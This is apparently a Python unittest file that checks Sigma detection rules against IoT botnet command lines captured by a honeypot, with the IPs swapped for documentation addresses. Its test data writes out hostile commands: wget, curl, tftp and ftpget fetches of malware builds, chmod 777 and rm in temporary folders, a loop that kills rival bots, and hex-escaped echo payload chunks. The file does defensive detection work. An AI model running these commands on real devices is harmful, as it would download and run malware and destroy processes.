"""Tests for what the Sigma rules in rules/ match, against command lines from the honeypot.

Run from the repository root (PyYAML comes with sigma-cli):

    python3 -m unittest discover -s tests

`sigma check` in CI checks that the rules are valid, not what they match. These tests read each
rule from rules/ as published and check it against real command lines from the honeypot's
Nov 3-10 sessions, one per process as a process-creation log would show them. Every IP is swapped
for a documentation address (192.0.2.0/24), and random BusyBox words and file names for others of
the same shape (upper case, lower case and digits in the same places), so none can be matched to
the honeypot. Long hex-escaped lines are cut short. Nothing is run.

A process-creation log can't see what a shell does itself. Builtins such as echo, printf, cd and
kill start no process, and a "> file" redirection is the shell's, so it's never in a command line.
The examples for those steps are what a log shows when the command does run as its own process,
such as /bin/busybox echo.

Sigma's own library has no way to match an event, so `sigma_matches` is a small evaluator for the
parts these rules use: the endswith, contains, re and cidr modifiers, keywords, lists, and
and/or/not, "all of" and "1 of" conditions. Like Sigma, endswith, contains and keywords ignore
case and re doesn't.
"""

import fnmatch
import ipaddress
import re
import unittest
from pathlib import Path

import yaml

RULES = Path(__file__).resolve().parent.parent / "rules"


def detection_of(name):
    return yaml.safe_load((RULES / name).read_text(encoding="utf-8"))["detection"]


def field_matches(event, spec, wanted):
    field, *modifiers = spec.split("|")
    assert set(modifiers) <= {"endswith", "contains", "re", "cidr"}, f"unsupported modifier in {spec}"
    actual = event.get(field)
    if actual is None:
        return False
    actual = str(actual)

    def one(value):
        if "re" in modifiers:
            return re.search(value, actual) is not None
        if "cidr" in modifiers:
            return ipaddress.ip_address(actual) in ipaddress.ip_network(value)
        a, v = actual.lower(), str(value).lower()
        if "contains" in modifiers:
            return v in a
        if "endswith" in modifiers:
            return a.endswith(v)
        return a == v

    return any(one(v) for v in (wanted if isinstance(wanted, list) else [wanted]))


def selection_matches(event, selection):
    if isinstance(selection, list):
        return any(selection_matches(event, s) for s in selection)
    if isinstance(selection, str):  # a keyword: anywhere in the log line, ignoring case
        return selection.lower() in str(event.get("message", "")).lower()
    return all(field_matches(event, spec, wanted) for spec, wanted in selection.items())


def sigma_matches(detection, event):
    results = {name: selection_matches(event, s) for name, s in detection.items() if name != "condition"}

    def quantified(m):
        hits = [hit for name, hit in results.items() if fnmatch.fnmatch(name, m[2])]
        assert hits, f"no selection matches {m[2]}"
        return str(all(hits) if m[1] == "all" else any(hits))

    condition = re.sub(r"\b(all|1) of (\S+)", quantified, detection["condition"])
    words = re.findall(r"\(|\)|\w+", condition)
    python = " ".join(w if w in ("(", ")", "and", "or", "not", "True", "False") else str(results[w])
                      for w in words)
    return eval(python, {"__builtins__": {}})  # only True, False, and, or, not and brackets


class BotSandboxChecksTests(unittest.TestCase):
    """Rule 07: a bot checking for a real shell."""

    def setUp(self):
        self.rule = detection_of("07_bot_sandbox_checks.yml")

    def matches(self, command):
        return sigma_matches(self.rule, {"CommandLine": command})

    def test_botnet_names_match(self):
        # The names the honeypot saw from Nov 3 to Nov 10 (none new after Nov 6). "Cult" isn't all
        # capitals.
        for word in ("SORA", "HISILICON", "V3G4", "KYTON", "YAKUZA", "UNSTABLE", "Cult", "BOTNET"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_the_three_random_words_seen_match(self):
        # Shaped like the random words bots sent on Nov 9 and Nov 10: two start with a capital and
        # one with a lower-case letter. The first version of the rule matched none of them.
        for word in ("ABcDe1Fg", "Abcd1EFg", "aBC1d2ef"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_the_echo_checks_still_match(self):
        # The writable-folder probe ends with BusyBox's echo, so that one is its own process. The
        # others are a shell's builtin echo, seen only where echo runs as a process.
        for command in ("/bin/busybox echo -e '\\x48\\x47\\x4a\\x4e\\x4e\\x4f'",
                        "echo -e '\\x48\\x47\\x4a\\x4e\\x4e\\x4f'", 'echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"',
                        "echo SHELL_TEST"):
            self.assertTrue(self.matches(command), command)

    def test_an_echo_with_more_flags_than_e_matches(self):
        # A bot on Nov 3-10 used echo -en, which decodes to HELLOWORLD. The rule wanted exactly -e.
        for command in ('echo -en "\\x48\\x45\\x4c\\x4c\\x4f\\x57\\x4f\\x52\\x4c\\x44"',
                        "/bin/busybox echo -ne '\\x48\\x45\\x4c\\x4c\\x4f'"):
            self.assertTrue(self.matches(command), command)

    def test_real_applets_do_not_match(self):
        for command in ("/bin/busybox wget -q -O x.sh http://192.0.2.10/x.sh", "/bin/busybox cat /proc/mounts",
                        "/bin/busybox hostname TENTOB", "/bin/busybox ls /home", "/bin/busybox dos2unix notes.txt",
                        "/bin/busybox sha256sum firmware.bin", "/bin/busybox", "echo hello"):
            self.assertFalse(self.matches(command), command)


class DefaultUsernameLoginTests(unittest.TestCase):
    """Rule 03: a login with a factory-default username. The names are the honeypot's; the lines
    are in util-linux login's syslog format, with a BusyBox root login."""

    NAMES = ("root", "admin", "default", "guest", "support", "user", "telnetadmin", "super", "telecomadmin",
             "Alphanetworks", "administrator", "hikvision")

    def setUp(self):
        self.rule = detection_of("03_default_username_login.yml")

    def matches(self, message):
        return sigma_matches(self.rule, {"message": message})

    def test_the_twelve_names_match(self):
        # The top 10 by IPs on Nov 3-10, plus administrator and hikvision from the Nov 3-6 list.
        for name in self.NAMES:
            line = (f"login[1234]: LOGIN ON pts/0 BY {name} FROM 192.0.2.10" if name != "root"
                    else "login[1234]: ROOT LOGIN ON pts/0 FROM 192.0.2.10")
            self.assertTrue(self.matches(line), name)
        self.assertTrue(self.matches("login[1234]: root login on 'pts/0' from '192.0.2.10'"))

    def test_other_logins_do_not_match(self):
        for line in ("login[1234]: LOGIN ON pts/0 BY tim FROM 192.0.2.10",
                     "sshd[99]: Accepted publickey for admin from 192.0.2.10 port 50122 ssh2"):
            self.assertFalse(self.matches(line), line)

    def test_each_name_matches_whole_so_longer_names_do_not(self):
        # The list is these 12 names. administrator matches as itself, not as a longer admin.
        for name in ("superadmin", "supervisor", "admin1", "Alphanetworks2", "rootuser"):
            self.assertFalse(self.matches(f"login[1234]: LOGIN ON pts/0 BY {name} FROM 192.0.2.10"), name)

    def test_a_remote_host_named_like_a_default_user_does_not_match(self):
        self.assertFalse(self.matches("login[1234]: LOGIN ON pts/0 BY tim FROM admin-laptop.lan"))

    def test_a_console_login_with_the_name_last_is_not_matched(self):
        # The cost of matching whole names: with nothing after it, the name has no boundary. A
        # telnet login always has FROM and the remote host after the name.
        self.assertFalse(self.matches("login[1234]: LOGIN ON tty1 BY admin"))


class PostLoginReconTests(unittest.TestCase):
    """Rule 06: the reconnaissance bots ran right after logging in."""

    def setUp(self):
        self.rule = detection_of("06_post_login_recon.yml")

    def matches(self, command):
        return sigma_matches(self.rule, {"CommandLine": command})

    def test_the_cpu_and_mount_checks_seen_match(self):
        # uname -m, to pick a malware build for the CPU, came from 58 sessions on Nov 3-10.
        for command in ("uname -m", "cat /proc/mounts", "uname -a", "cat /proc/cpuinfo"):
            self.assertTrue(self.matches(command), command)

    def test_other_system_commands_do_not_match(self):
        for command in ("uname -r", "cat /proc/meminfo", "ls /home", "/bin/busybox"):
            self.assertFalse(self.matches(command), command)


class DownloadAndExecuteTests(unittest.TestCase):
    """Rule 08: a download from a raw IP address, or a file made executable in a temporary folder."""

    def setUp(self):
        self.rule = detection_of("08_download_and_execute.yml")

    def matches(self, command, cwd=None):
        event = {"CommandLine": command}
        if cwd:
            event["CurrentDirectory"] = cwd
        return sigma_matches(self.rule, event)

    def test_every_kind_of_download_seen_matches(self):
        for command in ("wget -q -O main_arm7 http://192.0.2.13:8081/main_arm7", "curl -s -O http://192.0.2.13:8081/main_arm7",
                        "tftp -g -r main_arm7 192.0.2.13 69", "tftp 192.0.2.14 -c get telnet2.sh",
                        "ftpget -v -u anonymous -p anonymous -P 21 192.0.2.14 telnet2.sh telnet2.sh",
                        "/bin/busybox ftpget 192.0.2.17 ftpget.sh ftpget.sh",
                        "wget --no-check-certificate -qO- https://192.0.2.11/sh", "curl http://192.0.2.17/curl.sh -o-",
                        "wget -q -O ab3cde.sh http://192.0.2.12:9087/payload/k3m8pqr42xyz/ab3cde.sh"):
            self.assertTrue(self.matches(command), command)

    def test_an_ip_right_after_an_option_matches(self):
        # A real tftp line from Nov 10 had no space between -g and the server's address.
        self.assertTrue(self.matches("tftp -g192.0.2.17 -r tftp.sh -l-"))

    def test_a_relative_chmod_in_a_temporary_folder_matches(self):
        # Bots cd into a temporary folder first, so the file name in chmod has no folder in it.
        for command, cwd in (("chmod 777 main_arm7", "/tmp"), ("chmod 777 telnet2.sh", "/var/run"),
                             ("/bin/busybox chmod 777 .q4r7s1t9u3v6wy", "/dev/shm")):
            self.assertTrue(self.matches(command, cwd), command)

    def test_a_chmod_elsewhere_or_without_a_folder_does_not_match(self):
        self.assertFalse(self.matches("chmod +x deploy.sh", "/home/tim/project"))
        self.assertFalse(self.matches("chmod 777 main_arm7"), "needs the log source's CurrentDirectory")

    def test_ordinary_downloads_do_not_match(self):
        for command in ("wget https://downloads.example.org/tool.tar.gz", "curl -fsSLO https://example.com/install.sh"):
            self.assertFalse(self.matches(command), command)


class IotOutboundDropperPortTests(unittest.TestCase):
    """Rule 10: an IoT device calling out on a port the droppers used. Placeholder addresses."""

    def setUp(self):
        self.rule = detection_of("10_iot_outbound_dropper_ports.yml")

    def matches(self, dst_port, src_ip="10.50.0.12", dst_ip="192.0.2.13"):
        return sigma_matches(self.rule, {"src_ip": src_ip, "dst_ip": dst_ip, "dst_port": dst_port})

    def test_every_port_the_droppers_tried_matches(self):
        # FTP (21) came in from Nov 8, alongside the others.
        for port in (21, 69, 80, 443, 8081, 9087):
            self.assertTrue(self.matches(port), port)

    def test_approved_destinations_other_devices_and_other_ports_do_not_match(self):
        self.assertFalse(self.matches(80, dst_ip="192.0.2.50"))
        self.assertFalse(self.matches(80, src_ip="10.60.0.12"))
        self.assertFalse(self.matches(22))


class KillRivalBotsTests(unittest.TestCase):
    """Rule 11: killing other malware. The kill builtin starts no process; killall does."""

    def setUp(self):
        self.rule = detection_of("11_kill_rival_bots.yml")

    def matches(self, command):
        return sigma_matches(self.rule, {"CommandLine": command})

    def test_the_rival_kill_loop_matches(self):
        for command in ("busybox sh -c for p in mirai sora mozi hajime tsunami gafgyt yakuza owari josho ECCHI; "
                        "do killall -9 $p 2>/dev/null; done", "killall -9 mirai"):
            self.assertTrue(self.matches(command), command)

    def test_ordinary_kills_do_not_match(self):
        for command in ("killall -9 firefox", "pkill -HUP nginx"):
            self.assertFalse(self.matches(command), command)


class CleanupTests(unittest.TestCase):
    """Rule 12: deleting the dropped file or the shell history."""

    def setUp(self):
        self.rule = detection_of("12_cleanup_traces.yml")

    def matches(self, command, cwd=None):
        event = {"CommandLine": command}
        if cwd:
            event["CurrentDirectory"] = cwd
        return sigma_matches(self.rule, event)

    def test_a_relative_delete_in_a_temporary_folder_matches(self):
        # Every clean-up on Nov 3-10 deleted its script by name, after a cd.
        for command, cwd in (("rm -f kla.sh", "/tmp"), ("rm -rf telnet2.sh", "/tmp"), ("rm -rf all.sh", "/var/run"),
                             ("/bin/busybox rm -rf .q4r7s1t9u3v6wy k382", "/tmp")):
            self.assertTrue(self.matches(command, cwd), command)

    def test_absolute_temporary_deletes_still_match(self):
        self.assertTrue(self.matches("rm -f /tmp/x.sh"))

    def test_deletes_elsewhere_or_without_a_folder_do_not_match(self):
        self.assertFalse(self.matches("rm -rf build", "/home/tim/project"))
        self.assertFalse(self.matches("rm -f kla.sh"), "needs the log source's CurrentDirectory")


class HexEchoPayloadTests(unittest.TestCase):
    """Rule 17: a file built from hex-escaped echo or printf instead of a download."""

    # The one session that did this, Nov 3-10: three BusyBox echo -ne lines of 220, 220 and 54
    # escapes that wrote a shell script killing other processes. Each is cut to its first 40.
    CHUNKS = (
        '/bin/busybox echo -ne "\\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a\\x0a\\x66\\x6f\\x72\\x20\\x70\\x69\\x64'
        '\\x20\\x69\\x6e\\x20\\x2f\\x70\\x72\\x6f\\x63\\x2f\\x5b\\x30\\x2d\\x39\\x5d\\x2a\\x3b\\x20\\x64\\x6f\\x0a\\x20"',
        '/bin/busybox echo -ne "\\x7c\\x2a\\x22\\x2f\\x2e\\x22\\x2a\\x7c\\x2a\\x6d\\x69\\x72\\x61\\x69\\x2a\\x7c\\x2a\\x6d'
        '\\x6f\\x7a\\x69\\x2a\\x7c\\x2a\\x68\\x61\\x6a\\x69\\x6d\\x65\\x2a\\x7c\\x2a\\x73\\x6f\\x72\\x61\\x2a\\x7c\\x2a"',
        '/bin/busybox echo -ne "\\x7c\\x2a\\x61\\x61\\x72\\x63\\x68\\x36\\x34\\x2a\\x7c\\x2a\\x78\\x38\\x36\\x2a\\x29\\x20'
        '\\x6b\\x69\\x6c\\x6c\\x20\\x2d\\x39\\x20\\x24\\x7b\\x70\\x69\\x64\\x23\\x23\\x2a\\x2f\\x7d\\x20\\x3b\\x3b\\x0a"',
    )

    def setUp(self):
        self.rule = detection_of("17_hex_echo_payload.yml")

    def matches(self, command):
        return sigma_matches(self.rule, {"CommandLine": command})

    def test_the_real_chunks_match(self):
        for command in self.CHUNKS:
            self.assertTrue(self.matches(command), command[:60])

    def test_the_hex_markers_and_short_admin_writes_do_not_match(self):
        # The markers are real (up to 21 escapes, printed rather than written); the rest are
        # ordinary admin commands.
        for command in ("/bin/busybox echo -e '\\x48\\x47\\x4a\\x4e\\x4e\\x4f'",
                        'echo -e "\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A"',
                        'echo -e "\\x72\\x65\\x64\\x74\\x61\\x69\\x6C\\x5F\\x62\\x6F\\x74\\x5F\\x74\\x65\\x6C\\x6E\\x65\\x74\\x5F\\x6F\\x6B"',
                        "printf \\xef\\xbb\\xbf", "echo -ne \\x1b[32mOK\\x1b[0m", "echo -ne \\x01",
                        "printf \\x00\\x00\\x00\\x01", "printf \\x00\\x11\\x22\\x33\\x44\\x55", "printf " + "\\x8f" * 16,
                        "echo -e hello\\tworld"):
            self.assertFalse(self.matches(command), command[:60])

    def test_its_known_false_positives_match(self):
        # The cost of the rule, as its falsepositives say: a long hex write, or a file's magic bytes.
        for command in ("printf " + "\\xa1" * 32, "printf \\x23\\x21\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x0a",
                        "printf \\x7f\\x45\\x4c\\x46\\x01\\x01\\x01"):
            self.assertTrue(self.matches(command), command[:60])


class EvaluatorTests(unittest.TestCase):
    """The small evaluator above, so a broken evaluator can't make the rule tests pass."""

    def test_a_selection_needs_every_field_and_a_list_needs_one_item(self):
        detection = {"sel": {"Image|endswith": ["/a", "/b"], "CommandLine|contains": "x"}, "condition": "sel"}
        self.assertTrue(sigma_matches(detection, {"Image": "/bin/B", "CommandLine": "aXa"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/c", "CommandLine": "x"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/a", "CommandLine": "y"}))

    def test_regexes_keep_case_and_conditions_combine(self):
        detection = {"s_a": {"CommandLine|re": "A"}, "s_b": [{"Image": "/x"}, {"Image": "/y"}],
                     "condition": "s_a and not s_b"}
        self.assertTrue(sigma_matches(detection, {"Image": "/z", "CommandLine": "A"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/z", "CommandLine": "a"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/y", "CommandLine": "A"}))
        detection["condition"] = "1 of s_*"
        self.assertTrue(sigma_matches(detection, {"Image": "/y", "CommandLine": "a"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/z", "CommandLine": "a"}))

    def test_keywords_search_the_message_and_ignore_case(self):
        detection = {"keywords_a": ["LOGIN ON", "nothing"], "keywords_b": [" admin"],
                     "condition": "keywords_a and keywords_b"}
        self.assertTrue(sigma_matches(detection, {"message": "login[1]: login on pts/0 by ADMIN from x"}))
        self.assertFalse(sigma_matches(detection, {"message": "login[1]: LOGIN ON pts/0 BY tim"}))
        self.assertFalse(sigma_matches(detection, {"CommandLine": "LOGIN ON admin"}))

    def test_cidr_matches_a_network_and_numbers_compare_whole(self):
        detection = {"sel": {"src_ip|cidr": ["10.50.0.0/24"], "dst_port": [21, 69]}, "condition": "sel"}
        self.assertTrue(sigma_matches(detection, {"src_ip": "10.50.0.12", "dst_port": 21}))
        self.assertFalse(sigma_matches(detection, {"src_ip": "10.51.0.12", "dst_port": 21}))
        self.assertFalse(sigma_matches(detection, {"src_ip": "10.50.0.12", "dst_port": 2121}))


if __name__ == "__main__":
    unittest.main()
